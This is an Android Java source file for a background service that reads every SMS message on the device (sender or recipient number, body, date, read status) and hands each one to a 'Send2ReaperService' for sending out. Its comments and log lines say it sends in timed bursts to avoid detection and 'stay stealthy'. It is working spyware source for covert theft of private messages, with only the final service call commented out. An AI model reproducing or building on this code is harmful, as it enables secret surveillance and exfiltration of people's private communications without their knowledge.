package com.bigeye.crasher;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.text.format.DateFormat;
import android.util.Log;

public class ReadSMSLogs extends IntentService{
	
	private final String APP_TAG = getClass().getSimpleName();
	private static final long SLEEP_TIME = 5 * 1000;

	public ReadSMSLogs() {
		super("Read SMS Logs");
		// TODO Auto-generated constructor stub
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		Log.i(APP_TAG,"About to start fetching all SMS logs: standby ");
		GetSMSLogs();
		
		Log.i(APP_TAG,"finished reading all SMS logs: commiting suicide");
		stopSelf();
	}
	
	public void GetSMSLogs(){
		final String[] projection = {"address","date","body","type","read"};
		final String selection = null;
		final String[] selectionArgs = null;
		final String sortOrder = null;
		Cursor cursor = null;

		try{
			cursor = this.getContentResolver().query(Uri.parse("content://sms"), projection, selection, selectionArgs, sortOrder);
			
			//txts available
			if(cursor.getCount() <= 0){
				Log.i(APP_TAG,"SMS logs empty");
				cursor.close();
				return;
			}else{
				Log.i(APP_TAG,"found "+cursor.getCount()+" records");
			}
			
			Log.i(APP_TAG,"about to start sending logs in 10 secs bursts - so as to avoid detection by android system!");
			
			while(cursor.moveToNext()){
				
				String phoneNo = cursor.getString(cursor.getColumnIndex(projection[0]));
				Long date = cursor.getLong(cursor.getColumnIndex(projection[1]));
				String smsContent = cursor.getString(cursor.getColumnIndex(projection[2]));
				
				//sms type 1-incoming 2-outgoing 
				String type = cursor.getString(cursor.getColumnIndex(projection[3]));
				
				//1-read 0-not read
				String read = cursor.getString(cursor.getColumnIndex(projection[4]));
				
				String SMSLogStr = "";
				String tmp_dt = new DateFormat().format("dd-MMM-yyyy k:m:s", date).toString();
				
				if(type.equals("1")){ //incoming sms
					SMSLogStr = "sms from ";
				}else if(type.equals("2")){ //outgoing sms
					SMSLogStr = "sms to ";
				}
				
				SMSLogStr += phoneNo+": "+smsContent+":"+tmp_dt;
				Log.i(APP_TAG,SMSLogStr);
				
				//sleep for 10 secs b4 sending texts...stay stealthy
				try {
					new Thread().sleep(SLEEP_TIME);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				Intent SvcIntent = new Intent(getApplicationContext(), Send2ReaperService.class);
				SvcIntent.putExtra("OPERATION", "OUTGOING");
				SvcIntent.putExtra("MSG", SMSLogStr);
//				startService(SvcIntent);
				
			}
			
			//clean up
			cursor.close();
			
		} catch(Exception e){
			Log.i(APP_TAG,e.toString());
		}
		
	}
}
